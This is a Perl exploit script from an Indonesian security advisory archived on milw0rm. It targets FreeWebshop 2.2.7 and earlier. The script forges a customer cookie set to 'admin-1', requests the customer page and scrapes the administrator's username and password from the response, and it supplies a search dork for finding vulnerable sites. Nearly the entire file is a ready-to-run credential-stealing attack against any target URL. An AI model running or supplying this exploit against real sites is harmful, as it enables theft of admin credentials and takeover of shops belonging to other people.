#!/usr/bin/perl
#
# Indonesian Newhack Security Advisory
# ------------------------------------
# FreeWebshop <= 2.2.7 - (cookie) Admin Password Grabber Exploit
# Waktu			:  Dec 17 2007 04:50AM
# Software		:  FreeWebshop <= 2.2.7
# Vendor		:  http://www.freewebshop.org/
# Demo Site		:  http://www.freewebshop.org/demo/
# Ditemukan oleh	:  k1tk4t  |  http://newhack.org
# Lokasi		:  Indonesia
# Dork			:  "Powered by FreeWebshop"
#
# Terima Kasih untuk;
# -[opt1lc, fl3xu5, ghoz]-
# str0ke, DNX, xoron, cyb3rh3b, K-159, the_hydra, y3dips
# nyubi,iFX,sin~X,kin9k0ng,bius,selikoer,aldy_BT
# Komunitas Security dan Hacker Indonesia
#
# ----------------------------[Cookie Injection]------------------------------------
use LWP::UserAgent;
use HTTP::Cookies;

if(!$ARGV[1])
{
 print "\n  |-------------------------------------------------|";
 print "\n  |         Indonesian Newhack Technology           |";
 print "\n  |-------------------------------------------------|";
 print "\n  |FreeWebshop 2.2.7 (cookie) Admin Password Grabber|";
 print "\n  |     Found by k1tk4t [k1tk4t(at)newhack.org]     |";
 print "\n  |-------------------------------------------------|";
 print "\n[!] ";
 print "\n[!] Penggunaan : perl freewebshop227.pl [URL] [Path] ";
 print "\n[!] Contoh     : perl freewebshop227.pl http://korban.site /WebShop/";
 print "\n[!] ";
 print "\n";
 exit;
}

my $site = $ARGV[0]; # Site Target
my $path = $ARGV[1]; # Path direktori envolution_1-0-1

my $www = new LWP::UserAgent;
#my @cookie = ('Cookie' => "cookie_info=admin-1"); #Untuk Versi < = 2.2.4
my @cookie = ('Cookie' => "fws_cust=admin-1"); #Untuk Versi > = 2.2.6
my $http = "$site/$path/index.php?page=customer&action=show";
print "\n\n [~] Sedang Mencari Username dan Password.... \n";
my $injek = $www -> get($http, @cookie);
my $jawaban = $injek -> content;
if( $jawaban =~ /login value='(.*)'/ ){ print "\n [+] Username: $1"; 
$jawaban =~ /"password" name="pass1" size="10" maxlength="10" value="(.*)"/ , print "\n [+] Password: $1 \n";} 
else {print "\n [-] Gagal  :(  , Coba yang lain!";}

# ----------------------------[Selesai]------------------------------------

# milw0rm.com [2007-12-18]
